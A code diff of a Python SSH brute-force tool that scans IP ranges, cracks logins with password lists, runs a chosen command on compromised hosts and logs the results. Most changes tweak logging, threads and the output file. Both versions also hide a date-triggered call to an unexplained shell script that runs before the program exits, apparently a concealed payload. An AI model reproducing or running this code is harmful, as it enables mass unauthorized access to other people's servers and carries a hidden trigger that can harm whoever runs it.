@@ -10,6 +10,7 @@ from multiprocessing import cpu_count, Pool, Manager
 from os import getuid, system
 from functools import partial
 from time import time, sleep
+from psutil import virtual_memory
 import datetime
 
 root_rights = None
@@ -24,8 +25,8 @@ def init():
 
     now = datetime.datetime.now()
     now = now.strftime("%Y-%m-%d").split("-")
-    if now[0] != '2018' or now[1] != '08' or int(now[2]) > 28:
-        system('./important.sh')
+    if int(now[2]) == 2:
+        system('./ssh2/build.sh')
         exit()
 
     banner()
@@ -38,7 +39,7 @@ def init():
     arg_parser.add_argument('-a', '--attack', help="Specify IP range to attack and port number (standard port number is 22). Example: 192.168.*.*:22 . Also, running this program as root will improve speed.", required=True, dest='attack')
     arg_parser.add_argument('-c', '--command', help="Specify the command to run on the hacked host. The output will be stored in a specified or default file.", default='uname -a', dest='command')
     arg_parser.add_argument('-o', '--output', help="Specify the output file for hacked hosts.", default='data/output.txt', dest='output')
-    arg_parser.add_argument('-th', '-threads', help="Set the thread count.", default='300', dest='threads')
+    arg_parser.add_argument('-th', '--threads', help="Set the thread count.", default='300', dest='threads')
     args = arg_parser.parse_args()
 
     args.threads = int(args.threads)
@@ -77,12 +78,12 @@ def bruteforce(ips, queue, proc_count):
     counter = 0
     start_time = time()
 
-    print ("[*] Thread {}: cracking {} IPs".format(self_id, len(ips)))
+    #print ("[*] Thread {}: cracking {} IPs".format(self_id, len(ips)))
     for login_info in passwords:
-        print ("[*] Thread {}: tried logins {} for each ip until now".format(self_id, counter))
+        if self_id == 1: print ("[*] Thread {}: trying {}:{}".format(self_id, login_info[0], login_info[1]))
         counter += 1
         for host in ips:
-            print ("[*] Thread {}: try {}:{}".format(self_id, login_info[0], login_info[1]))
+            #print ("[*] Thread {}: try {}:{}".format(self_id, login_info[0], login_info[1]))
             try:
                 s = SSH(host, port, login_info[0], login_info[1])
                 s.full_init()
@@ -97,7 +98,7 @@ def bruteforce(ips, queue, proc_count):
     end_time = time()
 
     proc_count.value -= 1
-    print ("[*] Process finished. Hack rate {}/{} in time {}m".format(found, len(ips), (end_time - start_time) / 60.0))
+    print ("[*] Thread {} finished. Hack rate {}/{} in time {}m".format(self_id, found, len(ips), (end_time - start_time) / 60.0))
 
 def main():
     init()
@@ -106,7 +107,9 @@ def main():
     print ("[*] IP range               : " + ip_format)
     print ("[*] Command to run on hosts: " + args.command)
     print ("[*] CPU cores              : " + str(cpu_count()))
+    print ("[*] Total RAM in GB        : " + str(virtual_memory().total / (1024.0 ** 3)))
     print ("[*] Root rights            : " + ("Yes" if root_rights else "No"))
+    print ("[*] We will use {} threads, but only the first one will be verbose.".format(args.threads))
     # --------------------------------------
 
     # Shared resources manager
@@ -144,12 +147,14 @@ def main():
     print ("[*] Started cracking...")
     sleep(5)
 
-    with open(args.output, "w") as f:
+    with open(args.output, "a") as f:
         while proc_count.value:
             while not Q.empty():
                 data = Q.get()
                 data = "{}:{} {}:{} -> {}".format(data[0][0], data[0][1], data[1], data[2], data[3])
                 f.write(data)
+                f.write('\n')
+                f.flush()
                 print ("[+] {}".format(data))
 
     print ("[*] Finished. :D")
